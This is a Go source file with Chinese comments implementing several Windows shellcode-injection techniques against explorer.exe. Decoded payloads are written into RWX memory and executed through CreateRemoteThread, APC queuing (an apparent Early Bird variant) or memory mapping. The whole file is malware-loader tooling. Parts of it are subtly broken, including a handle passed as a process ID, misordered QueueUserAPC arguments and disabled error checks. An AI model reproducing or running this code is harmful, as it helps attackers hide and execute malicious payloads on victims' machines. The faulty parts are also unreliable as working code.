package tools

import (
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"syscall"
	"unsafe"
)

func createProcess(processName string) (windows.Handle, error) {
	processID, err := getProcessIdByName(processName)
	if err != nil {
		return 0, err
	}
	return windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, processID)
}

// 获取pid句柄
func getProcessHandleByName(processName string) (windows.Handle, error) {
	var processSnap windows.Handle
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	processSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(processSnap)

	if err := windows.Process32First(processSnap, &pe32); err != nil {
		return 0, err
	}

	for {
		currentProcessName := syscall.UTF16ToString(pe32.ExeFile[:])
		if currentProcessName == processName {
			return windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pe32.ProcessID)
		}
		if err := windows.Process32Next(processSnap, &pe32); err != nil {
			return 0, err
		}
	}
}

// 获取pid号
func getProcessIdByName(processName string) (uint32, error) {
	var processSnap windows.Handle
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	processSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(processSnap)

	if err := windows.Process32First(processSnap, &pe32); err != nil {
		return 0, err
	}

	for {
		currentProcessName := syscall.UTF16ToString(pe32.ExeFile[:])
		if currentProcessName == processName {
			return pe32.ProcessID, nil
		}
		if err := windows.Process32Next(processSnap, &pe32); err != nil {
			return 0, err
		}
	}
}

// 进程地址上分配内存
func allocateMemoryInProcess(hProcess windows.Handle, shellcode []byte) (uintptr, error) {
	size := uint32(len(shellcode))

	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
	}
	defer windows.FreeLibrary(kernel32Handle)

	virtualAllocExAddr, err := windows.GetProcAddress(kernel32Handle, "VirtualAllocEx")
	if err != nil {
	}
	lpBaseAddress, _, err := syscall.SyscallN(virtualAllocExAddr,
		uintptr(hProcess),
		0,
		uintptr(size),
		uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
		uintptr(windows.PAGE_EXECUTE_READWRITE))
	return lpBaseAddress, err
}

// 写入shellcode
func writeShellcodeToProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, shellcode []byte) error {
	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}
	defer windows.FreeLibrary(kernel32Handle)

	writeProcessMemoryAddr, err := windows.GetProcAddress(kernel32Handle, "WriteProcessMemory")
	if err != nil {
		return err
	}

	_, _, err = syscall.SyscallN(writeProcessMemoryAddr,
		uintptr(hProcess),
		lpBaseAddress,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0)
	return err
}

// 通过pid获取所有线程
func getAllThreadIdByProcessId(processID uint32) (uint32, error) {
	//bufferLength := uint32(1000)
	var te32 windows.ThreadEntry32
	te32.Size = uint32(unsafe.Sizeof(te32))

	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(hSnapshot)

	if err := windows.Thread32First(hSnapshot, &te32); err != nil {
		return 0, err
	}

	for {
		if te32.OwnerProcessID == processID {
			return te32.ThreadID, nil
		}
		if err := windows.Thread32Next(hSnapshot, &te32); err != nil {
			return 0, err
		}
	}
}

// 线程执行
func createRemoteThreadToExecute(hProcess windows.Handle, lpBaseAddress uintptr) error {
	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}
	defer windows.FreeLibrary(kernel32Handle)

	createRemoteThreadAddr, err := windows.GetProcAddress(kernel32Handle, "CreateRemoteThread")
	if err != nil {
		return err
	}

	_, _, err = syscall.SyscallN(createRemoteThreadAddr,
		uintptr(hProcess),
		0,
		0,
		lpBaseAddress,
		0,
		0,
		0)
	return err
}

// 插入apc
func setupAPC(lpBaseAddress uintptr, hThread windows.Handle) error {
	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}
	defer windows.FreeLibrary(kernel32Handle)

	queueUserAPCAddr, err := windows.GetProcAddress(kernel32Handle, "QueueUserAPC")
	if err != nil {
		return err
	}

	_, _, err = syscall.SyscallN(queueUserAPCAddr,
		uintptr(lpBaseAddress),
		uintptr(hThread),
		0)
	return err
}

// 内存复制
func memcpy(dst, src unsafe.Pointer, n uintptr) {
	for i := uintptr(0); i < n; i++ {
		*(*byte)(unsafe.Pointer(uintptr(dst) + i)) = *(*byte)(unsafe.Pointer(uintptr(src) + i))
	}
}

// 寻找pid 然后打开进程 申请空间后注入 最后通过新线程执行
func DirectShellcodeInject(fp string) error {
	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	shellcode := Decode(encodeDataByte)
	// 获取notepad.exe进程句柄
	hProcess, err := getProcessHandleByName("explorer.exe")
	defer windows.CloseHandle(hProcess)

	// 在目标进程中分配内存
	lpBaseAddress, err := allocateMemoryInProcess(hProcess, shellcode)

	//if err != nil {
	//	return err
	//}

	// 向目标进程内存写入shellcode
	err = writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode)
	//if err != nil {
	//	return err
	//}

	// 创建远程线程来执行注入的代码
	err = createRemoteThreadToExecute(hProcess, lpBaseAddress)
	//if err != nil {
	//	return err
	//}

	return nil
}

// 前面同理 执行是依靠找到一个线程句柄后插入apc队列
func ApcShellcodeInject(fp string) error {
	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	shellcode := Decode(encodeDataByte)
	var hProcess windows.Handle
	var hThread windows.Handle
	var processID uint32
	var threadID uint32
	// 获取explorer.exe进程ID
	processID, err = getProcessIdByName("explorer.exe")

	// 获取explorer.exe进程句柄
	hProcess, err = getProcessHandleByName("explorer.exe")
	defer windows.CloseHandle(hProcess)

	// 在目标进程中分配内存
	lpBaseAddress, err := allocateMemoryInProcess(hProcess, shellcode)

	// 向目标进程内存写入shellcode
	err = writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode)

	// 获取目标进程的一个线程ID
	threadID, err = getAllThreadIdByProcessId(processID)

	// 获取目标进程的线程句柄 0x001F03FF --》THREAD_ALL_ACCESS
	hThread, err = windows.OpenThread(0x001F03FF, false, threadID)
	defer windows.CloseHandle(hThread)

	// 设置异步过程调用（APC）
	err = setupAPC(lpBaseAddress, hThread)
	return nil
}

// 创建一个RWX的进程，通过apc注入shellcode到线程中
func EaybirlInject(fp string) error {
	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	shellcode := Decode(encodeDataByte)
	hProcess, err := createProcess("explorer.exe")
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hProcess)

	// 在进程地址上分配内存
	lpBaseAddress, err := allocateMemoryInProcess(hProcess, shellcode)
	if err != nil {
		return err
	}

	// 向分配的内存中写入shellcode
	if err := writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode); err != nil {
		return err
	}
	// 通过进程ID获取所有线程，这里只取第一个线程进行后续操作（可根据实际需求调整）
	threadID, err := getAllThreadIdByProcessId(uint32(hProcess))
	if err != nil {
		return err
	}
	hThread, err := windows.OpenThread(0x001F03FF, false, threadID)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hThread)
	setupAPC(uintptr(unsafe.Pointer(&shellcode[0])), hThread)

	return nil
}

// 内存映射注入shellcode
func MappingInject(fp string) error {
	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	shellcode := Decode(encodeDataByte)
	var si windows.StartupInfo
	//var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	// 创建文件映射对象，这里使用INVALID_HANDLE_VALUE对应的Go表示形式（通常为0或特定的无效值定义）
	hMapping, err := windows.CreateFileMapping(0, nil, windows.PAGE_EXECUTE_READWRITE, 0, 0, nil)
	if err != nil {
		// 处理错误，这里简单打印，实际可根据需求更细化处理
		println("创建文件映射对象失败:", err)
		return nil
	}
	defer windows.CloseHandle(hMapping)

	// 将文件映射对象映射到当前进程的地址空间
	lpMapAddress, err := windows.MapViewOfFile(hMapping, windows.FILE_MAP_WRITE, 0, 0, 0)
	if err != nil {
		println("映射文件到当前进程地址空间失败:", err)
		return nil
	}
	defer windows.UnmapViewOfFile(lpMapAddress)

	// 使用自定义的memcpy函数将shellcode复制到映射的内存地址
	memcpy(unsafe.Pointer(lpMapAddress), unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)))

	// 创建目标进程（这里以notepad.exe为例，可根据需求替换进程名）
	hProcess, err := createProcess("explorer.exe")
	if err != nil {
		println("创建进程失败:", err)
		return nil
	}
	defer windows.CloseHandle(hProcess)

	// 将文件映射对象映射到目标进程的地址空间，这里需要注意参数等要符合要求
	lpMapAddressRemote, err := allocateMemoryInProcess(hProcess, shellcode)
	if err != nil {
		// 处理错误
		return nil
	}

	// 将当前进程中的shellcode写入目标进程的内存
	err = writeShellcodeToProcessMemory(hProcess, lpMapAddressRemote, shellcode)
	if err != nil {
		// 处理错误
		return nil
	}

	defer windows.UnmapViewOfFile(lpMapAddressRemote)

	// 获取目标进程的一个线程ID
	threadID, err := getAllThreadIdByProcessId(uint32(hProcess))
	if err != nil {
		println("获取线程ID失败:", err)
		return nil
	}

	// 获取目标进程的线程句柄
	hThread, err := windows.OpenThread(0x001F03FF, false, threadID)
	if err != nil {
		println("获取线程句柄失败:", err)
		return nil
	}
	defer windows.CloseHandle(hThread)

	// 设置异步过程调用（APC）
	err = setupAPC(uintptr(lpMapAddressRemote), hThread)
	if err != nil {
		println("设置APC调用失败:", err)
		return nil
	}

	// 恢复线程执行，使线程有机会执行APC中的代码（shellcode）
	_, err = windows.ResumeThread(hThread)
	if err != nil {
		println("恢复线程执行失败:", err)
		return nil
	}
	return nil
}
